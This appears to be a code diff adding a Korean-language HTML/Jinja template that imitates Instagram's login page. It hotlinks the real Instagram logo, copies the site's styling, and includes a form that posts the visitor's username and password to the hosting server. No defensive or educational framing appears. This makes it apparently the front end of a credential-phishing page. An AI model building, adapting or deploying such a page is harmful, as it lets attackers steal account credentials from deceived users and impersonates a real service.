@@ -1,0 +1,97 @@
+<!DOCTYPE html>
+<html lang="ko">
+<head>
+  <meta charset="UTF-8">
+  <title>Instagram</title>
+  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
+  <style>
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Roboto', sans-serif;
+      background-color: #fafafa;
+    }
+
+    .container {
+      width: 100%;
+      max-width: 350px;
+      margin: 60px auto;
+      text-align: center;
+    }
+
+    .login-box {
+      background-color: white;
+      border: 1px solid #dbdbdb;
+      padding: 40px 40px 30px;
+    }
+
+    .login-box img.logo {
+      width: 175px;
+      margin-bottom: 30px;
+    }
+
+    input {
+      width: 100%;
+      margin: 6px 0;
+      padding: 10px;
+      background: #fafafa;
+      border: 1px solid #dbdbdb;
+      border-radius: 3px;
+      font-size: 14px;
+    }
+
+    button {
+      width: 100%;
+      margin-top: 10px;
+      padding: 8px;
+      background-color: #0095f6;
+      border: none;
+      color: white;
+      font-weight: bold;
+      border-radius: 4px;
+      cursor: pointer;
+      font-size: 14px;
+    }
+
+    .separator {
+      margin: 20px 0;
+      font-size: 12px;
+      color: #8e8e8e;
+    }
+
+    .signup-box {
+      background-color: white;
+      border: 1px solid #dbdbdb;
+      margin-top: 10px;
+      padding: 20px;
+    }
+
+    .error {
+      color: red;
+      font-size: 13px;
+      margin-top: 10px;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="login-box">
+      <img src="https://www.instagram.com/static/images/web/mobile_nav_type_logo.png/735145cfe0a4.png" alt="Instagram" class="logo">
+      <form method="post">
+        <input type="text" name="username" placeholder="전화번호, 사용자 이름 또는 이메일" required><br>
+        <input type="password" name="password" placeholder="비밀번호" required><br>
+        <button type="submit">로그인</button>
+      </form>
+      {% if error %}
+        <div class="error">{{ error }}</div>
+      {% endif %}
+      <div class="separator">또는</div>
+      <button style="background-color: #385185;">Facebook으로 로그인</button>
+    </div>
+
+    <div class="signup-box">
+      계정이 없으신가요? <a href="#">가입하기</a>
+    </div>
+  </div>
+</body>
+</html>
